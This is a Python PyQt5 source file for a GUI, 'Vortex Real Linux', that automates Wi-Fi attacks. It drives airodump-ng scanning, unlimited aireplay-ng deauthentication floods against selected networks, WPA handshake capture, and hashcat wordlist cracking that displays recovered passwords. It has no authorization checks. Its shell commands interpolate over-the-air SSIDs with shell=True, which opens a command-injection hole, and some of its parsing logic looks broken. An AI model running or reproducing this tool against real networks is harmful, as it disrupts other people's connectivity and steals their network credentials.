#!/usr/bin/env python3
"""Vortex Real Linux - Production Penetration Testing GUI

Integrates with real Linux tools:
- airmon-ng / iwconfig (wireless management)
- airodump-ng (network scanning)
- aireplay-ng (deauth attacks)
- aircrack-ng (WEP cracking)
- hashcat (WPA/WPA2 cracking)
- john (password cracking)

Requirements:
  sudo apt install aircrack-ng hashcat
  sudo pip install PyQt5 PyQtChart

Usage: sudo python3 vortex_real_linux.py
"""

import sys
import os
import subprocess
import threading
import re
import json
import time
from datetime import datetime, timedelta
from collections import deque
from pathlib import Path

try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QPushButton, QLabel, QTabWidget, QTableWidget, QTableWidgetItem,
        QTextEdit, QLineEdit, QComboBox, QSpinBox, QCheckBox, QFileDialog,
        QProgressBar, QMessageBox, QStatusBar, QSplitter, QGroupBox,
        QHeaderView, QDialog, QDialogButtonBox
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QProcess
    from PyQt5.QtGui import QFont, QColor
    print('[+] PyQt5 imported successfully')
except ImportError as e:
    print(f'[!] ERROR: {e}')
    print('[*] Install: pip install PyQt5 PyQtChart')
    sys.exit(1)


class SystemCommand:
    """Execute system commands safely."""
    
    @staticmethod
    def run(cmd, shell=False, timeout=30):
        """Run command and return output."""
        try:
            result = subprocess.run(
                cmd,
                shell=shell,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, '', 'Command timeout'
        except Exception as e:
            return -1, '', str(e)
    
    @staticmethod
    def run_async(cmd, shell=False):
        """Run command asynchronously."""
        process = subprocess.Popen(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return process


class NetworkScanner(QThread):
    """Real airodump-ng network scanner."""
    
    network_discovered = pyqtSignal(dict)
    scan_log = pyqtSignal(str)
    metrics_updated = pyqtSignal(dict)
    error_occurred = pyqtSignal(str)
    
    def __init__(self, interface='wlan0'):
        super().__init__()
        self.interface = interface
        self.is_running = False
        self.monitor_interface = None
        self.airodump_process = None
        self.cap_file = '/tmp/vortex_scan.csv'
        self.networks = {}
    
    def run(self):
        """Execute real airodump-ng scan."""
        self.is_running = True
        
        try:
            # Check if interface exists
            code, out, err = SystemCommand.run(['iwconfig', self.interface])
            if code != 0:
                self.error_occurred.emit(f'Interface {self.interface} not found')
                return
            
            self.scan_log.emit(f'[*] Found interface: {self.interface}')
            
            # Get monitor interface
            code, out, err = SystemCommand.run(
                f'sudo airmon-ng start {self.interface}',
                shell=True
            )
            
            if code != 0:
                self.error_occurred.emit(f'Failed to enable monitor mode: {err}')
                return
            
            # Extract monitor interface name
            match = re.search(r'(mon\d+|wlan\d+mon)', out)
            self.monitor_interface = match.group(1) if match else f'{self.interface}mon'
            self.scan_log.emit(f'[+] Monitor mode enabled: {self.monitor_interface}')
            
            # Start airodump-ng
            self.scan_log.emit('[*] Starting airodump-ng...')
            cmd = f'sudo airodump-ng -w {self.cap_file} --output-format csv {self.monitor_interface}'
            self.airodump_process = SystemCommand.run_async(cmd, shell=True)
            
            # Read CSV output
            csv_file = f'{self.cap_file}-01.csv'
            while self.is_running:
                time.sleep(2)
                
                if os.path.exists(csv_file):
                    try:
                        with open(csv_file, 'r') as f:
                            lines = f.readlines()
                        
                        # Parse airodump CSV format
                        in_networks = False
                        for line in lines:
                            if 'BSSID' in line:
                                in_networks = True
                                continue
                            if not line.strip() or in_networks and 'Station' in line:
                                break
                            
                            if in_networks and line.strip():
                                parts = [p.strip() for p in line.split(',')]
                                if len(parts) >= 7 and parts[0] != 'Station':
                                    try:
                                        bssid = parts[0]
                                        power = int(parts[8]) if parts[8] else -100
                                        beacons = int(parts[9]) if parts[9] else 0
                                        iv = parts[10] if len(parts) > 10 else 0
                                        lan_ip = parts[11] if len(parts) > 11 else '0.0.0.0'
                                        cipher = parts[12] if len(parts) > 12 else 'UNKNOWN'
                                        auth = parts[13] if len(parts) > 13 else 'UNKNOWN'
                                        ssid = parts[14] if len(parts) > 14 else '<Hidden>'
                                        
                                        if bssid not in self.networks:
                                            network = {
                                                'bssid': bssid,
                                                'ssid': ssid,
                                                'power': power,
                                                'beacons': beacons,
                                                'iv': iv,
                                                'cipher': cipher,
                                                'auth': auth,
                                                'clients': 0
                                            }
                                            self.networks[bssid] = network
                                            self.network_discovered.emit(network)
                                        else:
                                            self.networks[bssid].update({
                                                'power': power,
                                                'beacons': beacons,
                                                'iv': iv
                                            })
                                    except (ValueError, IndexError):
                                        pass
                        
                        # Update metrics
                        self.metrics_updated.emit({
                            'networks': len(self.networks),
                            'timestamp': datetime.now().isoformat()
                        })
                    
                    except Exception as e:
                        pass
        
        except Exception as e:
            self.error_occurred.emit(f'Scanner error: {str(e)}')
        
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up processes."""
        if self.airodump_process:
            try:
                self.airodump_process.terminate()
                self.airodump_process.wait(timeout=5)
            except:
                pass
        
        if self.monitor_interface:
            SystemCommand.run(
                f'sudo airmon-ng stop {self.monitor_interface}',
                shell=True
            )
        
        # Clean up cap files
        for f in Path('/tmp').glob('vortex_scan*'):
            try:
                f.unlink()
            except:
                pass
    
    def stop(self):
        """Stop scanner."""
        self.is_running = False
        self.scan_log.emit('[!] Stopping scanner...')


class DeauthAttack(QThread):
    """Real aireplay-ng deauthentication attack."""
    
    attack_log = pyqtSignal(str)
    status_changed = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    
    def __init__(self, monitor_interface, target_bssid, client_mac=None, count=0):
        super().__init__()
        self.monitor_interface = monitor_interface
        self.target_bssid = target_bssid
        self.client_mac = client_mac
        self.count = count  # 0 = infinite
        self.is_running = False
        self.process = None
    
    def run(self):
        """Execute real deauth attack."""
        self.is_running = True
        
        try:
            if self.client_mac:
                # Targeted deauth
                cmd = f'sudo aireplay-ng -0 {self.count} -a {self.target_bssid} -c {self.client_mac} {self.monitor_interface}'
                self.attack_log.emit(f'[*] Deauthing client {self.client_mac} from {self.target_bssid}')
            else:
                # Broadcast deauth
                cmd = f'sudo aireplay-ng -0 {self.count} -a {self.target_bssid} {self.monitor_interface}'
                self.attack_log.emit(f'[*] Broadcasting deauth to {self.target_bssid}')
            
            self.process = SystemCommand.run_async(cmd, shell=True)
            code, out, err = self.process.communicate()
            
            if code == 0:
                self.attack_log.emit('[+] Deauth frames sent successfully')
            else:
                self.error_occurred.emit(f'Deauth failed: {err}')
        
        except Exception as e:
            self.error_occurred.emit(f'Deauth error: {str(e)}')
    
    def stop(self):
        """Stop attack."""
        self.is_running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                pass


class HandshakeCapturer(QThread):
    """Capture WPA/WPA2 handshake."""
    
    handshake_found = pyqtSignal(str)
    capture_log = pyqtSignal(str)
    progress = pyqtSignal(int)
    error_occurred = pyqtSignal(str)
    
    def __init__(self, monitor_interface, target_bssid, output_file):
        super().__init__()
        self.monitor_interface = monitor_interface
        self.target_bssid = target_bssid
        self.output_file = output_file
        self.is_running = False
        self.airodump_process = None
        self.timeout = 60  # seconds
    
    def run(self):
        """Capture handshake."""
        self.is_running = True
        
        try:
            # Start airodump-ng on specific BSSID
            cmd = f'sudo airodump-ng -w {self.output_file} -c 6 --bssid {self.target_bssid} {self.monitor_interface}'
            self.capture_log.emit('[*] Starting handshake capture...')
            
            self.airodump_process = SystemCommand.run_async(cmd, shell=True)
            
            # Send deauth
            deauth = DeauthAttack(self.monitor_interface, self.target_bssid, count=5)
            deauth.attack_log.connect(self.capture_log.emit)
            deauth.start()
            
            # Wait for handshake
            start_time = time.time()
            found = False
            
            while self.is_running and (time.time() - start_time) < self.timeout:
                cap_file = f'{self.output_file}-01.cap'
                
                if os.path.exists(cap_file):
                    # Check for handshake
                    code, out, err = SystemCommand.run(
                        f'sudo aircrack-ng {cap_file} -J {self.output_file}_test 2>/dev/null',
                        shell=True,
                        timeout=5
                    )
                    
                    if 'Passphrase not in dictionary' in out or '1 handshake' in out:
                        self.handshake_found.emit(cap_file)
                        self.capture_log.emit('[+] Handshake captured!')
                        found = True
                        break
                
                progress = int(((time.time() - start_time) / self.timeout) * 100)
                self.progress.emit(progress)
                time.sleep(1)
            
            if not found:
                self.capture_log.emit('[!] Handshake not captured within timeout')
        
        except Exception as e:
            self.error_occurred.emit(f'Capture error: {str(e)}')
        
        finally:
            if self.airodump_process:
                try:
                    self.airodump_process.terminate()
                    self.airodump_process.wait(timeout=2)
                except:
                    pass
    
    def stop(self):
        """Stop capture."""
        self.is_running = False
        if self.airodump_process:
            try:
                self.airodump_process.terminate()
            except:
                pass


class WPACracker(QThread):
    """Real hashcat WPA/WPA2 cracking."""
    
    progress = pyqtSignal(dict)
    crack_log = pyqtSignal(str)
    password_found = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    
    def __init__(self, cap_file, wordlist, gpu=True):
        super().__init__()
        self.cap_file = cap_file
        self.wordlist = wordlist
        self.gpu = gpu
        self.is_running = False
        self.process = None
        self.hccapx_file = None
    
    def run(self):
        """Execute real hashcat attack."""
        self.is_running = True
        
        try:
            self.crack_log.emit('[*] Converting .cap to .hccapx...')
            
            # Convert cap to hccapx
            self.hccapx_file = self.cap_file.replace('.cap', '.hccapx')
            cmd = f'cap2hccapx.bin {self.cap_file} {self.hccapx_file}'
            code, out, err = SystemCommand.run(cmd, shell=True, timeout=30)
            
            if code != 0:
                self.error_occurred.emit(f'Conversion failed: {err}')
                return
            
            self.crack_log.emit('[+] Converted to .hccapx')
            self.crack_log.emit(f'[*] Starting hashcat with wordlist: {self.wordlist}')
            
            # Build hashcat command
            device = '-d 1,2' if self.gpu else '-d 1'  # GPU + CPU or CPU only
            cmd = f'hashcat -m 2500 {device} -a 0 --workload-profile=4 {self.hccapx_file} {self.wordlist}'
            
            self.process = SystemCommand.run_async(cmd, shell=True)
            code, out, err = self.process.communicate()
            
            # Parse hashcat output
            if 'recovered' in out.lower():
                match = re.search(r'recovered.*?: (.+?)$', out, re.MULTILINE | re.IGNORECASE)
                if match:
                    password = match.group(1).strip()
                    self.password_found.emit(password)
                    self.crack_log.emit(f'[+] PASSWORD FOUND: {password}')
                    return
            
            self.crack_log.emit('[!] Password not found in wordlist')
        
        except Exception as e:
            self.error_occurred.emit(f'Crack error: {str(e)}')
    
    def stop(self):
        """Stop cracking."""
        self.is_running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                pass


class VortexLinuxGUI(QMainWindow):
    """Production Vortex GUI for Linux."""
    
    def __init__(self):
        super().__init__()
        self.scanner = None
        self.deauth = None
        self.handshake_capturer = None
        self.cracker = None
        self.selected_network = None
        self.monitor_interface = 'wlan0mon'
        self.setup_ui()
        self.apply_theme()
        self.check_privileges()
    
    def check_privileges(self):
        """Check if running as root."""
        if os.geteuid() != 0:
            self.log_console('[!] WARNING: Not running as root')
            self.log_console('[*] Run with: sudo python3 vortex_real_linux.py')
    
    def setup_ui(self):
        """Setup GUI."""
        self.setWindowTitle('Vortex Linux - Real Penetration Testing')
        self.setGeometry(0, 0, 1920, 1080)
        self.setMinimumSize(1400, 800)
        
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        
        # Left: Scanner
        left = self.create_scanner_panel()
        main_layout.addWidget(left, 2)
        
        # Center: Attack
        center = self.create_attack_panel()
        main_layout.addWidget(center, 3)
        
        # Right: Console
        right = self.create_console_panel()
        main_layout.addWidget(right, 2)
        
        self.statusBar().showMessage('Ready')
    
    def create_scanner_panel(self):
        """Create scanner panel."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel('AIRODUMP-NG SCANNER')
        title.setFont(QFont('Arial', 11, QFont.Bold))
        title.setStyleSheet('color: #2ECC71; background: #1a1a1a; padding: 5px;')
        layout.addWidget(title)
        
        # Interface selection
        iface_layout = QHBoxLayout()
        iface_layout.addWidget(QLabel('Interface:'))
        self.iface_combo = QComboBox()
        self.iface_combo.addItems(['wlan0', 'wlan1', 'eth0', 'eth1'])
        iface_layout.addWidget(self.iface_combo)
        layout.addLayout(iface_layout)
        
        # Scan buttons
        btn_layout = QHBoxLayout()
        start_btn = QPushButton('START SCAN')
        start_btn.clicked.connect(self.start_scanner)
        start_btn.setStyleSheet(self.get_button_style('success'))
        btn_layout.addWidget(start_btn)
        
        stop_btn = QPushButton('STOP')
        stop_btn.clicked.connect(self.stop_scanner)
        stop_btn.setStyleSheet(self.get_button_style('danger'))
        btn_layout.addWidget(stop_btn)
        layout.addLayout(btn_layout)
        
        # Network table
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(8)
        self.network_table.setHorizontalHeaderLabels(
            ['BSSID', 'SSID', 'PWR', 'Beacons', 'IV', 'Cipher', 'Auth', 'Clients']
        )
        self.network_table.setSelectionBehavior(self.network_table.SelectRows)
        self.network_table.setSelectionMode(self.network_table.SingleSelection)
        self.network_table.itemSelectionChanged.connect(self.on_network_selected)
        layout.addWidget(self.network_table)
        
        # Network details
        detail_label = QLabel('NETWORK DETAILS')
        detail_label.setStyleSheet('color: #3498DB; background: #1a1a1a; padding: 3px; font-weight: bold;')
        layout.addWidget(detail_label)
        
        self.network_details = QTextEdit()
        self.network_details.setReadOnly(True)
        self.network_details.setMaximumHeight(100)
        layout.addWidget(self.network_details)
        
        return widget
    
    def create_attack_panel(self):
        """Create attack panel."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel('ATTACK AUTOMATION')
        title.setFont(QFont('Arial', 11, QFont.Bold))
        title.setStyleSheet('color: #E74C3C; background: #1a1a1a; padding: 5px;')
        layout.addWidget(title)
        
        # Attack Configuration
        config = QGroupBox('CONFIGURATION')
        config_layout = QVBoxLayout(config)
        
        # Attack type
        attack_h = QHBoxLayout()
        attack_h.addWidget(QLabel('Attack:'))
        self.attack_combo = QComboBox()
        self.attack_combo.addItems(['Handshake + Wordlist', 'Handshake + Hashcat', 'Deauth Only', 'WEP Crack'])
        attack_h.addWidget(self.attack_combo)
        config_layout.addLayout(attack_h)
        
        # Wordlist
        word_h = QHBoxLayout()
        word_h.addWidget(QLabel('Wordlist:'))
        self.wordlist_input = QLineEdit()
        self.wordlist_input.setPlaceholderText('/usr/share/wordlists/rockyou.txt')
        word_h.addWidget(self.wordlist_input)
        browse_btn = QPushButton('Browse')
        browse_btn.clicked.connect(self.browse_wordlist)
        word_h.addWidget(browse_btn)
        config_layout.addLayout(word_h)
        
        # GPU option
        self.gpu_check = QCheckBox('GPU Acceleration (Hashcat)')
        self.gpu_check.setChecked(True)
        config_layout.addWidget(self.gpu_check)
        
        layout.addWidget(config)
        
        # Attack Buttons
        ctrl = QGroupBox('ATTACK CONTROLS')
        ctrl_layout = QVBoxLayout(ctrl)
        
        btn_h = QHBoxLayout()
        
        deauth_btn = QPushButton('DEAUTH ATTACK')
        deauth_btn.clicked.connect(self.start_deauth)
        deauth_btn.setStyleSheet(self.get_button_style('attack'))
        btn_h.addWidget(deauth_btn)
        
        handshake_btn = QPushButton('CAPTURE HANDSHAKE')
        handshake_btn.clicked.connect(self.start_handshake_capture)
        handshake_btn.setStyleSheet(self.get_button_style('attack'))
        btn_h.addWidget(handshake_btn)
        
        crack_btn = QPushButton('CRACK PASSWORD')
        crack_btn.clicked.connect(self.start_crack)
        crack_btn.setStyleSheet(self.get_button_style('attack'))
        btn_h.addWidget(crack_btn)
        
        ctrl_layout.addLayout(btn_h)
        
        # Progress
        self.attack_progress = QProgressBar()
        ctrl_layout.addWidget(self.attack_progress)
        
        # Stats
        stats_layout = QVBoxLayout()
        self.speed_label = QLabel('Speed: 0 kps')
        self.speed_label.setStyleSheet('color: #3498DB; font-weight: bold;')
        stats_layout.addWidget(self.speed_label)
        
        self.progress_label = QLabel('Progress: 0%')
        self.progress_label.setStyleSheet('color: #3498DB; font-weight: bold;')
        stats_layout.addWidget(self.progress_label)
        
        ctrl_layout.addLayout(stats_layout)
        layout.addWidget(ctrl)
        layout.addStretch()
        
        return widget
    
    def create_console_panel(self):
        """Create console panel."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel('CONSOLE OUTPUT')
        title.setStyleSheet('color: #00FF00; background: #1a1a1a; padding: 3px; font-weight: bold;')
        layout.addWidget(title)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setFont(QFont('Courier', 9))
        self.console.setStyleSheet('background-color: #0D0D0D; color: #00FF00;')
        layout.addWidget(self.console)
        
        clear_btn = QPushButton('CLEAR LOG')
        clear_btn.clicked.connect(self.console.clear)
        clear_btn.setStyleSheet(self.get_button_style('secondary'))
        layout.addWidget(clear_btn)
        
        return widget
    
    def start_scanner(self):
        """Start airodump-ng scanner."""
        if self.scanner and self.scanner.isRunning():
            QMessageBox.warning(self, 'Scanner Running', 'Scanner already running')
            return
        
        interface = self.iface_combo.currentText()
        self.log_console(f'[*] Starting scanner on {interface}...')
        
        self.scanner = NetworkScanner(interface)
        self.scanner.network_discovered.connect(self.add_network)
        self.scanner.scan_log.connect(self.log_console)
        self.scanner.error_occurred.connect(self.on_error)
        self.scanner.start()
    
    def stop_scanner(self):
        """Stop scanner."""
        if self.scanner and self.scanner.isRunning():
            self.scanner.stop()
            self.scanner.wait()
    
    def add_network(self, network):
        """Add network to table."""
        row = self.network_table.rowCount()
        self.network_table.insertRow(row)
        
        self.network_table.setItem(row, 0, QTableWidgetItem(network['bssid']))
        self.network_table.setItem(row, 1, QTableWidgetItem(network['ssid']))
        self.network_table.setItem(row, 2, QTableWidgetItem(str(network['power'])))
        self.network_table.setItem(row, 3, QTableWidgetItem(str(network['beacons'])))
        self.network_table.setItem(row, 4, QTableWidgetItem(str(network['iv'])))
        self.network_table.setItem(row, 5, QTableWidgetItem(network['cipher']))
        self.network_table.setItem(row, 6, QTableWidgetItem(network['auth']))
        self.network_table.setItem(row, 7, QTableWidgetItem(str(network.get('clients', 0))))
    
    def on_network_selected(self):
        """Handle network selection."""
        rows = self.network_table.selectedIndexes()
        if rows:
            row = rows[0].row()
            self.selected_network = {
                'bssid': self.network_table.item(row, 0).text(),
                'ssid': self.network_table.item(row, 1).text(),
                'power': self.network_table.item(row, 2).text(),
                'cipher': self.network_table.item(row, 5).text(),
                'auth': self.network_table.item(row, 6).text(),
            }
            
            details = f"""
Target: {self.selected_network['ssid']}
BSSID: {self.selected_network['bssid']}
Signal: {self.selected_network['power']} dBm
Cipher: {self.selected_network['cipher']}
Auth: {self.selected_network['auth']}
            """
            self.network_details.setText(details)
    
    def start_deauth(self):
        """Start deauth attack."""
        if not self.selected_network:
            QMessageBox.warning(self, 'No Target', 'Select a network first')
            return
        
        self.log_console(f"[*] Starting deauth on {self.selected_network['bssid']}")
        
        self.deauth = DeauthAttack(self.monitor_interface, self.selected_network['bssid'], count=0)
        self.deauth.attack_log.connect(self.log_console)
        self.deauth.error_occurred.connect(self.on_error)
        self.deauth.start()
    
    def start_handshake_capture(self):
        """Start handshake capture."""
        if not self.selected_network:
            QMessageBox.warning(self, 'No Target', 'Select a network first')
            return
        
        output_file = f"/tmp/{self.selected_network['ssid'].replace(' ', '_')}"
        self.log_console(f"[*] Capturing handshake from {self.selected_network['ssid']}")
        
        self.handshake_capturer = HandshakeCapturer(
            self.monitor_interface,
            self.selected_network['bssid'],
            output_file
        )
        self.handshake_capturer.capture_log.connect(self.log_console)
        self.handshake_capturer.handshake_found.connect(self.on_handshake_captured)
        self.handshake_capturer.progress.connect(self.attack_progress.setValue)
        self.handshake_capturer.error_occurred.connect(self.on_error)
        self.handshake_capturer.start()
    
    def on_handshake_captured(self, cap_file):
        """Handle handshake capture completion."""
        self.log_console(f'[+] Handshake saved: {cap_file}')
        QMessageBox.information(self, 'Handshake Captured', f'Saved to: {cap_file}')
    
    def start_crack(self):
        """Start password cracking."""
        wordlist = self.wordlist_input.text()
        
        if not wordlist or not os.path.exists(wordlist):
            QMessageBox.warning(self, 'No Wordlist', 'Select a valid wordlist file')
            return
        
        cap_file = f"/tmp/{self.selected_network['ssid'].replace(' ', '_')}-01.cap"
        
        if not os.path.exists(cap_file):
            QMessageBox.warning(self, 'No Handshake', 'Capture handshake first')
            return
        
        self.log_console(f'[*] Starting crack: {cap_file}')
        
        self.cracker = WPACracker(cap_file, wordlist, self.gpu_check.isChecked())
        self.cracker.crack_log.connect(self.log_console)
        self.cracker.password_found.connect(self.on_password_found)
        self.cracker.error_occurred.connect(self.on_error)
        self.cracker.start()
    
    def on_password_found(self, password):
        """Handle password found."""
        self.log_console(f'\n[+] PASSWORD: {password}\n')
        QMessageBox.information(self, 'Password Found!', f'Password: {password}')
    
    def browse_wordlist(self):
        """Browse for wordlist."""
        path, _ = QFileDialog.getOpenFileName(
            self, 'Select Wordlist', '/usr/share/wordlists/', 'Text Files (*.txt)'
        )
        if path:
            self.wordlist_input.setText(path)
    
    def log_console(self, message):
        """Log to console."""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.console.append(f'[{timestamp}] {message}')
    
    def on_error(self, error):
        """Handle errors."""
        self.log_console(f'[!] ERROR: {error}')
        QMessageBox.critical(self, 'Error', error)
    
    def apply_theme(self):
        """Apply hacker theme."""
        self.setStyleSheet("""
        QMainWindow, QWidget {
            background-color: #0A0E27;
            color: #E0E0E0;
        }
        QGroupBox {
            color: #2ECC71;
            border: 1px solid #1A4D1A;
            border-radius: 3px;
            margin-top: 10px;
            padding-top: 10px;
        }
        QTableWidget {
            background-color: #0D1117;
            color: #E0E0E0;
            gridline-color: #21262D;
            border: 1px solid #21262D;
        }
        QHeaderView::section {
            background-color: #0D1117;
            color: #58A6FF;
            padding: 5px;
            border: 1px solid #21262D;
            font-weight: bold;
        }
        QTextEdit {
            background-color: #0D0D0D;
            color: #00FF00;
            border: 1px solid #1A4D1A;
            font-family: 'Courier New';
        }
        QLineEdit, QComboBox, QSpinBox {
            background-color: #161B22;
            color: #E0E0E0;
            border: 1px solid #21262D;
            padding: 5px;
            border-radius: 3px;
        }
        QCheckBox {
            color: #E0E0E0;
        }
        QProgressBar {
            border: 1px solid #21262D;
            border-radius: 3px;
            background-color: #0D1117;
            color: #2ECC71;
        }
        QProgressBar::chunk {
            background-color: #2ECC71;
        }
        QStatusBar {
            background-color: #161B22;
            color: #58A6FF;
            border-top: 1px solid #21262D;
        }
        """)
    
    def get_button_style(self, button_type='default'):
        """Get button style."""
        styles = {
            'success': 'QPushButton { background-color: #238636; color: white; border: 1px solid #2EA043; border-radius: 3px; padding: 5px 15px; font-weight: bold; } QPushButton:hover { background-color: #2EA043; }',
            'danger': 'QPushButton { background-color: #DA3633; color: white; border: 1px solid #F85149; border-radius: 3px; padding: 5px 15px; font-weight: bold; } QPushButton:hover { background-color: #F85149; }',
            'attack': 'QPushButton { background-color: #D1342B; color: white; border: 2px solid #FF4444; border-radius: 3px; padding: 8px 20px; font-weight: bold; font-size: 11px; } QPushButton:hover { background-color: #FF4444; }',
            'secondary': 'QPushButton { background-color: #1F6FEB; color: white; border: 1px solid #388BFD; border-radius: 3px; padding: 5px 15px; font-weight: bold; } QPushButton:hover { background-color: #388BFD; }'
        }
        return styles.get(button_type, styles['secondary'])


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = VortexLinuxGUI()
    window.show()
    sys.exit(app.exec_())
